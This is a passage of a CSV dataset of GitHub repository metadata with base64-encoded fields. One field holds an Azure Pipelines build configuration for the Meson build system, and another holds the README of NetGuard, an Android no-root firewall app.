name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
cyBmcm9tIGEgZm9yayBpcyBjdXJyZW50bHkgYmxvY2tlZAogICAgICBjb25k
aXRpb246IGFuZChlcSh2YXJpYWJsZXNbJ3N5c3RlbS5wdWxscmVxdWVzdC5p
c2ZvcmsnXSwgZmFsc2UpLCBub3QoY2FuY2VsZWQoKSkpCiAgICAtIHRhc2s6
IFB1Ymxpc2hUZXN0UmVzdWx0c0AyCiAgICAgIGNvbmRpdGlvbjogbm90KGNh
bmNlbGVkKCkpCiAgICAgIGlucHV0czoKICAgICAgICB0ZXN0UmVzdWx0c0Zp
bGVzOiBtZXNvbi10ZXN0LXJ1bi54bWwKICAgICAgICB0ZXN0UnVuVGl0bGU6
ICQoU3lzdGVtLkpvYk5hbWUpCgotIGpvYjogbXN5czIKICBwb29sOgogICAg
dm1JbWFnZTogVlMyMDE3LVdpbjIwMTYKICBzdHJhdGVneToKICAgIG1hdHJp
eDoKICAgICAgZ2NjeDg2bmluamE6CiAgICAgICAgTVNZU1RFTTogTUlOR1cz
MgogICAgICAgIE1TWVMyX0FSQ0g6IGk2ODYKICAgICAgICBjb21waWxlcjog
Z2NjCiAgICAgIGdjY3g2NG5pbmphOgogICAgICAgIE1TWVNURU06IE1JTkdX
NjQKICAgICAgICBNU1lTMl9BUkNIOiB4ODZfNjQKICAgICAgICBjb21waWxl
cjogZ2NjCiAgICAgIGNsYW5neDY0bmluamE6CiAgICAgICAgTVNZU1RFTTog
TUlOR1c2NAogICAgICAgIE1TWVMyX0FSQ0g6IHg4Nl82NAogICAgICAgIGNv
bXBpbGVyOiBjbGFuZwogIHZhcmlhYmxlczoKICAgIE1TWVMyX1JPT1Q6ICQo
U3lzdGVtLldvcmtmb2xkZXIpXG1zeXM2NAogIHN0ZXBzOgogICAgLSBzY3Jp
cHQ6IHwKICAgICAgICBjaG9jbyBpbnN0YWxsIG1zeXMyIC0tcGFyYW1zPSIv
SW5zdGFsbERpcjolTVNZUzJfUk9PVCUgL05vVXBkYXRlIC9Ob1BhdGgiCiAg
ICAgIGRpc3BsYXlOYW1lOiBJbnN0YWxsIE1TWVMyCiAgICAtIHNjcmlwdDog
fAogICAgICAgIHNldCBQQVRIPSVNU1lTMl9ST09UJVx1c3JcYmluOyVTeXN0
ZW1Sb290JVxzeXN0ZW0zMjslU3lzdGVtUm9vdCU7JVN5c3RlbVJvb3QlXFN5
c3RlbTMyXFdiZW0KICAgICAgICAlTVNZUzJfUk9PVCVcdXNyXGJpblxwYWNt
YW4gLS1ub2NvbmZpcm0gLVN5eXV1CiAgICAgICAgJU1TWVMyX1JPT1QlXHVz
clxiaW5ccGFjbWFuIC0tbm9jb25maXJtIC1TeXV1CiAgICAgIGRpc3BsYXlO
YW1lOiBVcGRhdGUgTVNZUzIKICAgIC0gc2NyaXB0OiB8CiAgICAgICAgc2V0
IFBBVEg9JU1TWVMyX1JPT1QlXHVzclxiaW47JVN5c3RlbVJvb3QlXHN5c3Rl
bTMyOyVTeXN0ZW1Sb290JTslU3lzdGVtUm9vdCVcU3lzdGVtMzJcV2JlbQog
ICAgICAgIGlmICVjb21waWxlciU9PWdjYyAoIHNldCAiVE9PTENIQUlOPW1p
bmd3LXc2NC0kKE1TWVMyX0FSQ0gpLXRvb2xjaGFpbiIgKSBlbHNlICggc2V0
ICJUT09MQ0hBSU49bWluZ3ctdzY0LSQoTVNZUzJfQVJDSCktY2xhbmciICkK
ICAgICAgICAlTVNZUzJfUk9PVCVcdXNyXGJpblxwYWNtYW4gLS1ub2NvbmZp
cm0gLS1uZWVkZWQgLVMgXgogICAgICAgIGJhc2UtZGV2ZWwgXgogICAgICAg
IGdpdCBeCiAgICAgICAgbWVyY3VyaWFsIF4KICAgICAgICBtaW5ndy13NjQt
JChNU1lTMl9BUkNIKS1jbWFrZSBeCiAgICAgICAgbWluZ3ctdzY0LSQoTVNZ
UzJfQVJDSCktbmluamEgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FS
Q0gpLXBrZy1jb25maWcgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FS
Q0gpLXB5dGhvbjIgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FSQ0gp
LXB5dGhvbjMgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FSQ0gpLXB5
dGhvbjMtc2V0dXB0b29scyBeCiAgICAgICAgJVRPT0xDSEFJTiUKICAgICAg
ZGlzcGxheU5hbWU6IEluc3RhbGwgRGVwZW5kZW5jaWVzCiAgICAtIHBvd2Vy
c2hlbGw6IHwKICAgICAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9tZXNvbmJ1
aWxkL21lc29uL2lzc3Vlcy81ODA3CiAgICAgICAgIyBodHRwczovL2dpdGh1
Yi5jb20vbXN5czIvTUlOR1ctcGFja2FnZXMvaXNzdWVzLzU3MTkjaXNzdWVj
b21tZW50LTUyNTg0NTc2OQogICAgICAgIGlmICgkZW52OmNvbXBpbGVyIC1l
cSAnZ2NjJykgewogICAgICAgICAgKE5ldy1PYmplY3QgbmV0LndlYmNsaWVu
dCkuRG93bmxvYWRGaWxlKCJodHRwczovL2dpdGh1Yi5jb20vbWVzb25idWls
ZC9jaWRhdGEvcmF3L21hc3Rlci93aW4zMi9zZXRkbGxjaGFyYWN0ZXJpc3Rp
Y3MuZXhlIiwgIiQoU3lzdGVtLldvcmtGb2xkZXIpXHNldGRsbGNoYXJhY3Rl
cmlzdGljcy5leGUiKQogICAgICAgICAgaWYgKCRlbnY6TVNZUzJfQVJDSCAt
ZXEgJ3g4Nl82NCcpIHsKICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRl
cilcc2V0ZGxsY2hhcmFjdGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxt
aW5ndzY0XGxpYlxnY2NceDg2XzY0LXc2NC1taW5ndzMyXDkuMi4wXGNjMS5l
eGUKICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRlcilcc2V0ZGxsY2hh
cmFjdGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxtaW5ndzY0XGxpYlxn
Y2NceDg2XzY0LXc2NC1taW5ndzMyXDkuMi4wXGNjMXBsdXMuZXhlCiAgICAg
ICAgICB9IGVsc2UgewogICAgICAgICAgICAkKFN5c3RlbS5Xb3JrRm9sZGVy
KVxzZXRkbGxjaGFyYWN0ZXJpc3RpY3MgLWQgJGVudjpNU1lTMl9ST09UXG1p
bmd3MzJcbGliXGdjY1xpNjg2LXc2NC1taW5ndzMyXDkuMi4wXGNjMS5leGUK
ICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRlcilcc2V0ZGxsY2hhcmFj
dGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxtaW5ndzMyXGxpYlxnY2Nc
aTY4Ni13NjQtbWluZ3czMlw5LjIuMFxjYzFwbHVzLmV4ZQogICAgICAgICAg
fQogICAgICAgIH0KICAgICAgZGlzcGxheU5hbWU6IE1TWVMyIFBDSCBoYWNr
CiAgICAtIHNjcmlwdDogfAogICAgICAgIHNldCBCT09TVF9ST09UPQogICAg
ICAgIHNldCBQQVRIPSVTeXN0ZW1Sb290JVxzeXN0ZW0zMjslU3lzdGVtUm9v
dCU7JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFdiZW0KICAgICAgICBzZXQgUEFU
SEVYVD0lUEFUSEVYVCU7LnB5CiAgICAgICAgaWYgJWNvbXBpbGVyJT09Y2xh
bmcgKCBzZXQgQ0M9Y2xhbmcgJiYgc2V0IENYWD1jbGFuZysrICYmIHNldCBP
QkpDPWNsYW5nICYmIHNldCBPQkpDWFg9Y2xhbmcrKyApCiAgICAgICAgJU1T
WVMyX1JPT1QlXHVzclxiaW5cYmFzaCAtbGMgIk1TWVNURU09IHB5dGhvbjMg
cnVuX3Rlc3RzLnB5IC0tYmFja2VuZD1uaW5qYSIKICAgICAgZW52OgogICAg
ICAgIENIRVJFX0lOVk9LSU5HOiB5ZXMKICAgICAgZGlzcGxheU5hbWU6IFJ1
biBUZXN0cwogICAgLSB0YXNrOiBDb3B5RmlsZXNAMgogICAgICBjb25kaXRp
b246IG5vdChjYW5jZWxlZCgpKQogICAgICBpbnB1dHM6CiAgICAgICAgY29u
dGVudHM6ICdtZXNvbi10ZXN0LXJ1bi4qJwogICAgICAgIHRhcmdldEZvbGRl
cjogJChCdWlsZC5BcnRpZmFjdFN0YWdpbmdEaXJlY3RvcnkpCiAgICAtIHRh
c2s6IFB1Ymxpc2hCdWlsZEFydGlmYWN0c0AxCiAgICAgIGlucHV0czoKICAg
ICAgICBhcnRpZmFjdE5hbWU6ICQoU3lzdGVtLkpvYk5hbWUpCiAgICAgICMg
cHVibGlzaGluZyBhcnRpZmFjdHMgZnJvbSBQUnMgZnJvbSBhIGZvcmsgaXMg
Y3VycmVudGx5IGJsb2NrZWQKICAgICAgY29uZGl0aW9uOiBhbmQoZXEodmFy
aWFibGVzWydzeXN0ZW0ucHVsbHJlcXVlc3QuaXNmb3JrJ10sIGZhbHNlKSwg
bm90KGNhbmNlbGVkKCkpKQogICAgLSB0YXNrOiBQdWJsaXNoVGVzdFJlc3Vs
dHNAMgogICAgICBjb25kaXRpb246IG5vdChjYW5jZWxlZCgpKQogICAgICBp
bnB1dHM6CiAgICAgICAgdGVzdFJlc3VsdHNGaWxlczogbWVzb24tdGVzdC1y
dW4ueG1sCiAgICAgICAgdGVzdFJ1blRpdGxlOiAkKFN5c3RlbS5Kb2JOYW1l
KQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'NetGuard',44877925,b'A simple way to block access to the internet per application',b'Java',2,2384,,2384,False,b'https://api.github.com/repos/M66B/NetGuard/forks',"IyBOZXRHdWFyZAoKKk5ldEd1YXJkKiBwcm92aWRlcyBzaW1wbGUgYW5kIGFk
dmFuY2VkIHdheXMgdG8gYmxvY2sgYWNjZXNzIHRvIHRoZSBpbnRlcm5ldCAt
IG5vIHJvb3QgcmVxdWlyZWQuCkFwcGxpY2F0aW9ucyBhbmQgYWRkcmVzc2Vz
IGNhbiBpbmRpdmlkdWFsbHkgYmUgYWxsb3dlZCBvciBkZW5pZWQgYWNjZXNz
IHRvIHlvdXIgV2ktRmkgYW5kL29yIG1vYmlsZSBjb25uZWN0aW9uLgoKQmxv
Y2tpbmcgYWNjZXNzIHRvIHRoZSBpbnRlcm5ldCBjYW4gaGVscDoKCiogcmVk
dWNlIHlvdXIgZGF0YSB1c2FnZQoqIHNhdmUgeW91ciBiYXR0ZXJ5CiogaW5j
cmVhc2UgeW91ciBwcml2YWN5CgpOZXRHdWFyZCBpcyB0aGUgZmlyc3QgZnJl
ZSBhbmQgb3BlbiBzb3VyY2Ugbm8tcm9vdCBmaXJld2FsbCBmb3IgQW5kcm9p
ZC4KCkZlYXR1cmVzOgoKKiBTaW1wbGUgdG8gdXNlCiogTm8gcm9vdCByZXF1
aXJlZAoqIDEwMCUgb3BlbiBzb3VyY2UKKiBObyBjYWxsaW5nIGhvbWUKKiBO
byB0cmFja2luZyBvciBhbmFseXRpY3MKKiBBY3RpdmVseSBkZXZlbG9wZWQg
YW5kIHN1cHBvcnRlZAoqIEFuZHJvaWQgNS4xIGFuZCBsYXRlciBzdXBwb3J0
ZWQKKiBJUHY0L0lQdjYgVENQL1VEUCBzdXBwb3J0ZWQKKiBUZXRoZXJpbmcg
c3VwcG9ydGVkCiogT3B0aW9uYWxseSBhbGxvdyB3aGVuIHNjcmVlbiBvbgoq
IE9wdGlvbmFsbHkgYmxvY2sgd2hlbiByb2FtaW5nCiogT3B0aW9uYWxseSBi
bG9jayBzeXN0ZW0gYXBwbGljYXRpb25zCiogT3B0aW9uYWxseSBmb3J3YXJk
IHBvcnRzLCBhbHNvIHRvIGV4dGVybmFsIGFkZHJlc3NlcyAobm90IGF2YWls
YWJsZSBpZiBpbnN0YWxsZWQgZnJvbSB0aGUgUGxheSBzdG9yZSkKKiBPcHRp
b25hbGx5IG5vdGlmeSB3aGVuIGFuIGFwcGxpY2F0aW9uIGFjY2Vzc2VzIHRo
ZSBpbnRlcm5ldAoqIE9wdGlvbmFsbHkgcmVjb3JkIG5ldHdvcmsgdXNhZ2Ug
cGVyIGFwcGxpY2F0aW9uIHBlciBhZGRyZXNzCiogT3B0aW9uYWxseSBbYmxv
Y2sgYWRzIHVzaW5nIGEgaG9zdHMgZmlsZV0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvQURCTE9DS0lORy5tZCkgKG5v
dCBhdmFpbGFibGUgaWYgaW5zdGFsbGVkIGZyb20gdGhlIFBsYXkgc3RvcmUp
CiogTWF0ZXJpYWwgZGVzaWduIHRoZW1lIHdpdGggbGlnaHQgYW5kIGRhcmsg
dGhlbWUKClBSTyBmZWF0dXJlczoKCiogTG9nIGFsbCBvdXRnb2luZyB0cmFm
ZmljOyBzZWFyY2ggYW5kIGZpbHRlciBhY2Nlc3MgYXR0ZW1wdHM7IGV4cG9y
dCBQQ0FQIGZpbGVzIHRvIGFuYWx5emUgdHJhZmZpYwoqIEFsbG93L2Jsb2Nr
IGluZGl2aWR1YWwgYWRkcmVzc2VzIHBlciBhcHBsaWNhdGlvbgoqIE5ldyBh
cHBsaWNhdGlvbiBub3RpZmljYXRpb25zOyBjb25maWd1cmUgTmV0R3VhcmQg
ZGlyZWN0bHkgZnJvbSB0aGUgbm90aWZpY2F0aW9uCiogRGlzcGxheSBuZXR3
b3JrIHNwZWVkIGdyYXBoIGluIGEgc3RhdHVzIGJhciBub3RpZmljYXRpb24K
KiBTZWxlY3QgZnJvbSBmaXZlIGFkZGl0aW9uYWwgdGhlbWVzIGluIGJvdGgg
bGlnaHQgYW5kIGRhcmsgdmVyc2lvbgoKVGhlcmUgaXMgbm8gb3RoZXIgbm8t
cm9vdCBmaXJld2FsbCBvZmZlcmluZyBhbGwgdGhlc2UgZmVhdHVyZXMuCgpS
ZXF1aXJlbWVudHM6CgoqIEFuZHJvaWQgNS4xIG9yIGxhdGVyCiogQSBbY29t
cGF0aWJsZSBkZXZpY2VdKCNjb21wYXRpYmlsaXR5KQoKRG93bmxvYWRzOgoK
KiBbR2l0SHViXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9y
ZWxlYXNlcykKKiBbR29vZ2xlIFBsYXldKGh0dHBzOi8vcGxheS5nb29nbGUu
Y29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1ldS5mYWlyY29kZS5uZXRndWFy
ZCkKCkNlcnRpZmljYXRlIGZpbmdlcnByaW50czoKCiogTUQ1OiBCNjo0QTpF
ODowODoxQzozQzo5QzoxOTpENjo5RToyOTowMDo0Njo4OTpEQTo3MwoqIFNI
QTE6IEVGOjQ2OkY4OjEzOkQyOkM4OkEwOjY0OkQ3OjJDOjkzOjZCOjlCOjk2
OkQxOkNDOkNDOjk4OjkzOjc4CiogU0hBMjU2OiBFNDpBMjo2MDpBMjpEQzpF
NzpCNzpBRjoyMzpFRTo5MTo5Qzo0ODo5RToxNTpGRDowMTowMjpCOTozRjo5
RTo3Qzo5RDo4MjpCMDo5QzowQjozOTo1MDowMDpFNDpENAoKVXNhZ2U6Cgoq
IEVuYWJsZSB0aGUgZmlyZXdhbGwgdXNpbmcgdGhlIHN3aXRjaCBpbiB0aGUg
YWN0aW9uIGJhcgoqIEFsbG93L2RlbnkgV2ktRmkvbW9iaWxlIGludGVybmV0
IGFjY2VzcyB1c2luZyB0aGUgaWNvbnMgYWxvbmcgdGhlIHJpZ2h0IHNpZGUg
b2YgdGhlIGFwcGxpY2F0aW9uIGxpc3QKCllvdSBjYW4gdXNlIHRoZSBzZXR0
aW5ncyBtZW51IHRvIGNoYW5nZSBmcm9tIGJsYWNrbGlzdCBtb2RlIChhbGxv
dyBhbGwgaW4gKlNldHRpbmdzKiBidXQgYmxvY2sgdW53YW50ZWQgYXBwbGlj
YXRpb25zIGluIGxpc3QpIHRvIHdoaXRlbGlzdCBtb2RlIChibG9jayBhbGwg
aW4gKlNldHRpbmdzKiBidXQgYWxsb3cgZmF2b3JpdGUgYXBwbGljYXRpb25z
IGluIGxpc3QpLgoKKiBSZWQvb3JhbmdlL3llbGxvdy9hbWJlciA9IGludGVy
bmV0IGFjY2VzcyBkZW5pZWQKKiBUZWFsL2JsdWUvcHVycGxlL2dyZXkgPSBp
bnRlcm5ldCBhY2Nlc3MgYWxsb3dlZAoKPGltZyBzcmM9Imh0dHBzOi8vcmF3
LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NNjZCL05ldEd1YXJkL21hc3Rlci9z
Y3JlZW5zaG90cy8wMS1tYWluLnBuZyIgd2lkdGg9IjMyMCIgaGVpZ2h0PSI1
NjkiIC8+CjxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
dC5jb20vTTY2Qi9OZXRHdWFyZC9tYXN0ZXIvc2NyZWVuc2hvdHMvMDItbWFp
bi1kZXRhaWxzLnBuZyIgd2lkdGg9IjMyMCIgaGVpZ2h0PSI1NjkiIC8+Cjxp
bWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTTY2
Qi9OZXRHdWFyZC9tYXN0ZXIvc2NyZWVuc2hvdHMvMDMtbWFpbi1hY2Nlc3Mu
cG5nIiB3aWR0aD0iMzIwIiBoZWlnaHQ9IjU2OSIgLz4KPGltZyBzcmM9Imh0
dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NNjZCL05ldEd1YXJk
L21hc3Rlci9zY3JlZW5zaG90cy8wOC1ub3RpZmljYXRpb25zLnBuZyIgd2lk
dGg9IjMyMCIgaGVpZ2h0PSI1NjkiIC8+CgpGb3IgbW9yZSBzY3JlZW5zaG90
cywgc2VlIFtoZXJlXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFy
ZC90cmVlL21hc3Rlci9zY3JlZW5zaG90cykuCgpDb21wYXRpYmlsaXR5Ci0t
LS0tLS0tLS0tLS0KClRoZSBvbmx5IHdheSB0byBidWlsZCBhIG5vLXJvb3Qg
ZmlyZXdhbGwgb24gQW5kcm9pZCBpcyB0byB1c2UgdGhlIEFuZHJvaWQgVlBO
IHNlcnZpY2UuCkFuZHJvaWQgZG9lc24ndCBhbGxvdyBjaGFpbmluZyBvZiBW
UE4gc2VydmljZXMsIHNvIHlvdSBjYW5ub3QgdXNlIE5ldEd1YXJkIHRvZ2V0
aGVyIHdpdGggb3RoZXIgVlBOIGJhc2VkIGFwcGxpY2F0aW9ucy4KU2VlIGFs
c28gW3RoaXMgRkFRXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFy
ZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTIpLgoKTmV0
R3VhcmQgY2FuIGJlIHVzZWQgb24gcm9vdGVkIGRldmljZXMgdG9vIGFuZCBl
dmVuIG9mZmVycyBtb3JlIGZlYXR1cmVzIHRoYW4gbW9zdCByb290IGZpcmV3
YWxscy4KClNvbWUgQW5kcm9pZCB2ZXJzaW9ucywgZXhwZWNpYWxseSBub3Qg
dXBkYXRlZCBTYW1zdW5nIEFuZHJvaWQgdmVyc2lvbnMsIGhhdmUgYSBidWdn
eSBWUE4gaW1wbGVtZW50YXRpb24sCndoaWNoIHJlc3VsdHMgaW4gQW5kcm9p
ZCByZWZ1c2luZyB0byBzdGFydCB0aGUgVlBOIHNlcnZpY2UgaW4gY2VydGFp
biBjaXJjdW1zdGFuY2VzLApsaWtlIHdoZW4gdGhlcmUgaXMgbm8gaW50ZXJu
ZXQgY29ubmNlY3Rpdml0eSB5ZXQgKHdoZW4gc3RhcnRpbmcgdXAgeW91ciBk
ZXZpY2UpCm9yIHdoZW4gaW5jb3JyZWN0bHkgcmVxdWlyaW5nIG1hbnVhbCBh
cHByb3ZhbCBvZiB0aGUgVlBOIHNlcnZpY2UgYWdhaW4gKHdoZW4gc3RhcnRp
bmcgdXAgeW91ciBkZXZpY2UpLgpVbmZvcnR1bmF0ZWx5IHRoZXNlIEFuZHJv
aWQgYnVncyBjYW5ub3QgYmUgd29ya2VkIGFyb3VuZCBieSBOZXRHdWFyZC4K
CkZpbHRlcmluZyBtb2RlIGNhbm5vdCBiZSB1c2VkIG9uIFtDb3BwZXJoZWFk
T1NdKGh0dHBzOi8vY29wcGVyaGVhZC5jby9hbmRyb2lkLykuCgpOZXRHdWFy
ZCB3aWxsIG5vdCB3b3JrIG9yIGNyYXNoIHdoZW4gdGhlIHBhY2thZ2UgKmNv
bS5hbmRyb2lkLnZwbmRpYWxvZ3MqIGhhcyBiZWVuIHJlbW92ZWQgb3Igb3Ro
ZXJ3aXNlIGlzIHVuYXZhaWxhYmxlLgpSZW1vdmluZyB0aGlzIHBhY2thZ2Ug
aXMgcG9zc2libGUgd2l0aCByb290IHBlcm1pc3Npb25zIG9ubHkuCgpOZXRH
dWFyZCBpcyBzdXBwb3J0ZWQgZm9yIHBob25lcyBhbmQgdGFibGV0cyBvbmx5
LCBzbyBub3QgZm9yIG90aGVyIGRldmljZSB0eXBlcyBsaWtlIG9uIGEgdGVs
ZXZpc2lvbiBvciBpbiBhIGNhci4KCldpLUZpIG9yIElQIGNhbGxpbmcgd2ls
bCBub3Qgd29yayBpZiB5b3VyIHByb3ZpZGVyIHVzZXMgW0lQc2VjXShodHRw
czovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JUHNlYykgdG8gZW5jcnlwdCB5
b3VyIHBob25lIGNhbGxzLCBTTVMgbWVzc2FnZXMgYW5kL29yIE1NUyBtZXNz
YWdlcywKdW5sZXNzIHRoZXJlIHdhcyBtYWRlIGFuIGV4Y2VwdGlvbiBpbiBO
ZXRHdWFyZCBmb3IgeW91ciBwcm92aWRlciAoY3VycmVudGx5IGZvciBULU1v
YmlsZSBhbmQgVmVyaXpvbikuCkkgYW0gaGFwcHkgdG8gYWRkIGV4Y2VwdGlv
bnMgZm9yIG90aGVyIHByb3ZpZGVycywgYnV0IEkgbmVlZCB0aGUgW01DQ10o
aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTW9iaWxlX2NvdW50cnlf
Y29kZSkgY29kZXMsIFtNTkNdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93
aWtpL01OQykgY29kZXMgYW5kIFtJUCBhZGRyZXNzXShodHRwczovL2VuLndp
a2lwZWRpYS5vcmcvd2lraS9JUF9hZGRyZXNzKSByYW5nZXMgeW91ciBwcm92
aWRlciBpcyB1c2luZy4KQXMgYW4gYWx0ZXJuYXRpdmUgeW91IGNhbiBlbmFi
bGUgdGhlIG9wdGlvbiAnKkRpc2FibGUgb24gY2FsbConLCB3aGljaCBpcyBh
dmFpbGFibGUgc2luY2UgdmVyc2lvbiAyLjExMy4KCgo8YSBuYW1lPSJGQVEi
PjwvYT4KRnJlcXVlbnRseSBBc2tlZCBRdWVzdGlvbnMgKEZBUSkKLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCjxhIG5hbWU9IkZBUTAiPjwv
YT4KWyoqKDApIEhvdyBkbyBJIHVzZSBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9n
aXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3Vz
ZXItY29udGVudC1mYXEwKQoKPGEgbmFtZT0iRkFRMSI+PC9hPgpbKiooMSkg
Q2FuIE5ldEd1YXJkIGNvbXBsZXRlbHkgcHJvdGVjdCBteSBwcml2YWN5Pyoq
XShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rl
ci9GQVEubWQjdXNlci1jb250ZW50LWZhcTEpCgo8YSBuYW1lPSJGQVEyIj48
L2E+ClsqKigyKSBDYW4gSSB1c2UgYW5vdGhlciBWUE4gYXBwbGljYXRpb24g
d2hpbGUgdXNpbmcgTmV0R3VhcmQ/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9N
NjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQt
ZmFxMikKCjxhIG5hbWU9IkZBUTMiPjwvYT4KWyoqKDMpIENhbiBJIHVzZSBO
ZXRHdWFyZCBvbiBhbnkgQW5kcm9pZCB2ZXJzaW9uPyoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTMpCgo8YSBuYW1lPSJGQVE0Ij48L2E+ClsqKig0KSBX
aWxsIE5ldEd1YXJkIHVzZSBleHRyYSBiYXR0ZXJ5IHBvd2VyPyoqXShodHRw
czovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEu
bWQjdXNlci1jb250ZW50LWZhcTQpCgo8YSBuYW1lPSJGQVE2Ij48L2E+Clsq
Kig2KSBXaWxsIE5ldEd1YXJkIHNlbmQgbXkgaW50ZXJuZXQgdHJhZmZpYyB0
byBhbiBleHRlcm5hbCAoVlBOKSBzZXJ2ZXI/KipdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNv
bnRlbnQtZmFxNikKCjxhIG5hbWU9IkZBUTciPjwvYT4KWyoqKDcpIFdoeSBh
cmUgYXBwbGljYXRpb25zIHdpdGhvdXQgaW50ZXJuZXQgcGVybWlzc2lvbiBz
aG93bj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxv
Yi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXE3KQoKPGEgbmFtZT0i
RkFROCI+PC9hPgpbKiooOCkgV2hhdCBkbyBJIG5lZWQgdG8gZW5hYmxlIGZv
ciB0aGUgR29vZ2xlIFBsYXnihKIgc3RvcmUgYXBwIHRvIHdvcms/KipdKGh0
dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZB
